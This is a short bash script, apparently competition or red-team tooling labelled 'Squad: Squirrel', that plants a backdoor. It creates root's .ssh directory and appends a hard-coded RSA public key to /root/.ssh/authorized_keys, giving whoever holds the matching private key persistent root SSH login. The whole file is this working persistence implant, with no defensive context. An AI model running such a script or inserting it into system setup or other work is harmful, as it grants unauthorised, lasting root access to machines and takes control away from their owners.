#!/bin/bash
# Squad: Squirrel
# Purpose: Implant direct root SSH access via authorized_keys 

PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDI3CQZKcVWHjaBuajyJ/Dwu/ibvo4cQnAC7NMI1QXE0CXK2QP3EU++CRGcP/ykijZFdVuEMCXLL8FL0n4oSLTJjvernuoA0k6O33MFDi8ECokWl5IKibyDBdKdWuVDmpN+GfqHt7QkhodAQ73QTqiLZIKoImRS/+US+A6K8NZiJjGD3m/ck+f1zjUMawep6epBJDQxs/nHiLurmzs5/zKf2oTRoexVBmzBnDbR+6TR0ptZHlQjuIrsyXCRFr2jiEDieWy2MyOsbVPCRuQoU8KAknDtzTX6BNczzHaiQnXWz7iRqpLiuY/vqcg5vCwlACCtEl+46rQnXjU2mB7J1DC/"

SSH_DIR="/root/.ssh"
AUTH_FILE="${SSH_DIR}/authorized_keys"

mkdir -p "${SSH_DIR}"
chmod 700 "${SSH_DIR}"
chown root:root "${SSH_DIR}"

# only append if our exact key isn't already there
if ! grep -q -F "${PUBKEY}" "${AUTH_FILE}" 2>/dev/null; then
    echo "${PUBKEY}" >> "${AUTH_FILE}"
fi

chmod 600 "${AUTH_FILE}"
chown root:root "${AUTH_FILE}"
